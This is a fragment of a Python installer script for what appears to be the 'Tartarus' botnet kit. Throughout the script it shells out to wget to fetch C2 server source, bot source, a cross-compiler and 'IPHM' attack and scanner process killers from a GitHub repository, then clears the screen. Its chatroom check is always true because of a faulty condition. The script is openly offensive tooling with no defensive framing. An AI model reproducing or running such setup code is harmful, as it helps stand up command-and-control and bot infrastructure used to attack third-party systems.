...
Tartarus("wget -q https://raw.githubusercontent.com/Vexvain/Tartarus/master/Main/c2.c -O c2.c")
time.sleep(2)
print(""+ lightred +"Finished!")
print(""+ white +"Downloading "+ lightred +"Tartarus Bot")
Tartarus("wget -q https://raw.githubusercontent.com/Vexvain/Tartarus/master/Autosetup/bot.c -O bot.c")
time.sleep(2)
print(""+ lightred +"Finished!")
print(""+ white +"Downloading "+ lightred +"Tartarus Cross-Compiler")
Tartarus("wget -q https://raw.githubusercontent.com/Vexvain/Tartarus/master/Main/Tartarus.py -O Tartarus.py")
time.sleep(2)
print(""+ lightred +"Finished!")
print(""+ white +"Downloading "+ lightred +"Resolver Header")
Tartarus("wget -q https://raw.githubusercontent.com/Vexvain/Tartarus/master/Main/resolver.h -O resolver.h")
time.sleep(2)
print(""+ lightred +"Finished!")
print(""+ white +"Downloading "+ lightred +"IPHM Scanner Process Killer")
Tartarus("wget -q https://raw.githubusercontent.com/Vexvain/Tartarus/master/Main/scripts/IPHM_Scanner_Process_Killerv2.py -O IPHM_Scanner_Process_Killerv2.py")
time.sleep(2)
print(""+ lightred +"Finished!")
print(""+ white +"Downloading "+ lightred +"IPHM Attack process killer")
Tartarus("wget -q https://raw.githubusercontent.com/Vexvain/Tartarus/master/Main/scripts/IPHM_Attack_Process_Killerv2.py -O IPHM_Attack_Process_Killerv2.py")
time.sleep(2)
print(""+ lightred +"Finished!")
print(""+ white +"Downloading "+ lightred +"IPLookup API")
Tartarus("wget -q https://raw.githubusercontent.com/Vexvain/Tartarus/master/Main/iplookup.php -O iplookup.php")
time.sleep(2)
print(""+ lightred +"Finished!")
time.sleep(2)
Tartarus("clear")
...
if chatroom == "y" or "Y":
    ...
    time.sleep(2)
    Tartarus("wget -q https://raw.githubusercontent.com/Vexvain/Tartarus/master/chatroom/chat.c -O chat.c")
